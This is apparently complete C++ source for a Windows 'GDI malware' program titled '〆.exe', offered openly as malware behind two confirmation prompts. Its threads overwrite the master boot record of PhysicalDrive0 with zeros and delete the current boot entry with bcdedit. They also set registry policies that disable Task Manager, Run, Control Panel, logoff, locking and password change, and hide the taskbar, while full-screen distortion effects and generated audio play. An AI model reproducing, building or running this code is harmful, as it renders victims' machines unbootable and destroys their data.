typedef struct IUnknown IUnknown;
#include <windows.h>
#include <math.h>
#include <cstdint>
#include <cstdlib>
#include <tchar.h>
#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "winmm.lib")

const unsigned char MBR[512]{};

DWORD WINAPI MBROverwriter(LPVOID lpParam) {
    DWORD Bytes;
    HANDLE hFile = CreateFileA(
        "\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, NULL, NULL);
    WriteFile(hFile, MBR, 512, &Bytes, NULL);
    return 1;
}

DWORD WINAPI disabler(LPVOID lpParam) {
    system("taskkill /f /im taskmgr.exe");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
    system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
    system("bcdedit /delete {current}");
    return 1;
}

DWORD WINAPI taskbar(LPVOID lpvd) {
    static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
    ShowWindow(hShellWnd, SW_HIDE);
    return 0;
}

void sound1(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            t * sin(t / 105 >> 0)
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound2(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            ((t * sin(t >> 5) / 3000) * t) + t
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound3(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            (((sin(t >> (2 + (3 & t >> 15)))) * (sin(t >> 12))) * 200) - 128
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound4(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            (((sin(t / 16)) < (sin(t >> 13))) * t) * 10
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

void sound5(int hz, int secs) {
    const int sample_rate = hz;
    const int channels = 1;
    const int bits_per_sample = 8;
    const int data_size = sample_rate * secs;

    BYTE* data = new BYTE[data_size];
    for (int t = 2; t < data_size; ++t) {
        data[t] = static_cast<BYTE>(
            (t ^ ((t * t) >> 18)) * 10
            );
    }

    uint32_t total_size = 44 + data_size;
    BYTE* wav = new BYTE[total_size];
    BYTE* ptr = wav;

    auto write = [&](const void* src, size_t size) {
        memcpy(ptr, src, size);
        ptr += size;
        };

    write("RIFF", 4);
    uint32_t chunk_size = total_size - 8;
    write(&chunk_size, 4);
    write("WAVE", 4);

    write("fmt ", 4);
    uint32_t subchunk1_size = 16;
    write(&subchunk1_size, 4);
    uint16_t audio_format = 1;
    write(&audio_format, 2);
    uint16_t num_channels = channels;
    write(&num_channels, 2);
    uint32_t sample_rate_dw = sample_rate;
    write(&sample_rate_dw, 4);
    uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
    write(&byte_rate, 4);
    uint16_t block_align = channels * bits_per_sample / 8;
    write(&block_align, 2);
    uint16_t bits_per_sample_w = bits_per_sample;
    write(&bits_per_sample_w, 2);

    write("data", 4);
    uint32_t subchunk2_size = data_size;
    write(&subchunk2_size, 4);
    write(data, data_size);

    PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

    delete[] data;
    delete[] wav;
}

DWORD WINAPI payload1(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);

    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    SelectObject(memDC, hBitmap);

    POINT ptSrc = { 0, 0 };
    SIZE sizeWnd = { w, h };
    POINT ptDst = { 0, 0 };

    BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, 0 };

    int t = 0;


    while (1)
    {
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        DWORD* pixel = (DWORD*)bits;

        for (int y = 0; y < h; y++)
        {
            for (int x = 0; x < w; x++)
            {
                int srcX = x + (int)(sin(0.01 * y + t * 0.05) * 200);
                int srcY = y + (int)(sin(0.01 * x + t * 0.05) * 200);

                if (srcX < 0) srcX += w;
                if (srcX >= w) srcX -= w;
                if (srcY < 0) srcY += h;
                if (srcY >= h) srcY -= h;

                pixel[y * w + x] = pixel[srcY * w + srcX] + t;
            }
        }

        UpdateLayeredWindow(hwnd, hdc, &ptDst, &sizeWnd, memDC, &ptSrc, 0, &blend, ULW_ALPHA);

        t++;
    }

    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    DestroyWindow(hwnd);

    return 0;
}

DWORD WINAPI payload2(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);

    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    SelectObject(memDC, hBitmap);

    POINT ptSrc = { 0, 0 };
    SIZE sizeWnd = { w, h };
    POINT ptDst = { 0, 0 };

    BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, 0 };

    int t = 0;


    while (1)
    {
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        DWORD* pixel = (DWORD*)bits;

        for (int y = 0; y < h; y++)
        {
            for (int x = 0; x < w; x++)
            {
                int srcX = x + (int)(asin(sin(0.001 * y + t * 0.15)) * 400);
                int srcY = y + (int)(asin(sin(0.001 * x + t * 0.05)) * 400);

                if (srcX < 0) srcX += w;
                if (srcX >= w) srcX -= w;
                if (srcY < 0) srcY += h;
                if (srcY >= h) srcY -= h;

                pixel[y * w + x] = pixel[srcY * w + srcX] >> (2 + (3 & (t << 1)));
            }
        }

        UpdateLayeredWindow(hwnd, hdc, &ptDst, &sizeWnd, memDC, &ptSrc, 0, &blend, ULW_ALPHA);

        t++;
    }

    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    DestroyWindow(hwnd);

    return 0;
}

DWORD WINAPI payload3(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);

    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    SelectObject(memDC, hBitmap);

    POINT ptSrc = { 0, 0 };
    SIZE sizeWnd = { w, h };
    POINT ptDst = { 0, 0 };

    BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, 0 };

    int t = 0;


    while (1)
    {
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        DWORD* pixel = (DWORD*)bits;

        for (int y = 0; y < h; y++)
        {
            for (int x = 0; x < w; x++)
            {
                int srcX = x + (int)(sin(sin(0.01 * y + t * 0.15) * 3) * t);
                int srcY = y + (int)(asin(sin(0.01 * x + t * 0.05)) * t) + (x ^ (t * 10));

                if (srcX < 0) srcX += w;
                if (srcX >= w) srcX -= w;
                if (srcY < 0) srcY += h;
                if (srcY >= h) srcY -= h;

                pixel[y * w + x] = (pixel[srcY * w + srcX] | (200 + (300 & (t << 4)))) * 1000;
            }
        }

        UpdateLayeredWindow(hwnd, hdc, &ptDst, &sizeWnd, memDC, &ptSrc, 0, &blend, ULW_ALPHA);

        t++;
    }

    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    DestroyWindow(hwnd);

    return 0;
}

DWORD WINAPI payload4(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);

    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    SelectObject(memDC, hBitmap);

    POINT ptSrc = { 0, 0 };
    SIZE sizeWnd = { w, h };
    POINT ptDst = { 0, 0 };

    BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, 0 };

    int t = 0;


    while (1)
    {
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        DWORD* pixel = (DWORD*)bits;

        for (int y = 0; y < h; y++)
        {
            for (int x = 0; x < w; x++)
            {
                int srcX = (x ^ t) % w;
                int srcY = (y ^ t) % h;

                pixel[y * w + x] = pixel[srcY * w + srcX] * (7 & t);
            }
        }

        UpdateLayeredWindow(hwnd, hdc, &ptDst, &sizeWnd, memDC, &ptSrc, 0, &blend, ULW_ALPHA);

        t++;
    }

    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    DestroyWindow(hwnd);

    return 0;
}

DWORD WINAPI payload5(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"static",
        L"gdi distortion",
        WS_POPUP,
        0, 0, w, h,
        NULL, NULL, hInstance, NULL
    );

    ShowWindow(hwnd, SW_SHOW);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, w, h, SWP_SHOWWINDOW | SWP_NOACTIVATE);

    HDC hdc = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(hdc);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = NULL;
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    SelectObject(memDC, hBitmap);

    POINT ptSrc = { 0, 0 };
    SIZE sizeWnd = { w, h };
    POINT ptDst = { 0, 0 };

    BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, 0 };

    int t = 0;


    while (1)
    {
        BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

        DWORD* pixel = (DWORD*)bits;

        for (int y = 0; y < h; y++)
        {
            for (int x = 0; x < w; x++)
            {
                int srcX = ((t * 10) & (x + (t * 10))) % w;
                int srcY = ((t * 10) | (y + (t * 10))) % h;

                pixel[y * w + x] = pixel[srcY * w + srcX] >> t;
            }
        }

        UpdateLayeredWindow(hwnd, hdc, &ptDst, &sizeWnd, memDC, &ptSrc, 0, &blend, ULW_ALPHA);

        t++;
    }

    DeleteObject(hBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
    DestroyWindow(hwnd);

    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    if (MessageBoxW(0, L"Run malware?", L"〆.exe by UltraDasher965", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
    if (MessageBoxW(0, L"Are you sure?", L"〆.exe - Final Warning", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
    CreateThread(0, 0, MBROverwriter, 0, 0, 0);
    CreateThread(0, 0, disabler, 0, 0, 0);
    CreateThread(0, 0, taskbar, 0, 0, 0);
    Sleep(5000);
    HANDLE thread = CreateThread(0, 0, payload1, 0, 0, 0);
    sound1(48000, 30);
    TerminateThread(thread, 0);
    CloseHandle(thread);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
    sound2(48000, 30);
    TerminateThread(thread2, 0);
    CloseHandle(thread2);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
    sound3(48000, 30);
    TerminateThread(thread3, 0);
    CloseHandle(thread3);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
    sound4(48000, 30);
    TerminateThread(thread4, 0);
    CloseHandle(thread4);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
    HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
    sound5(48000, 30);
    TerminateThread(thread5, 0);
    CloseHandle(thread5);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);
}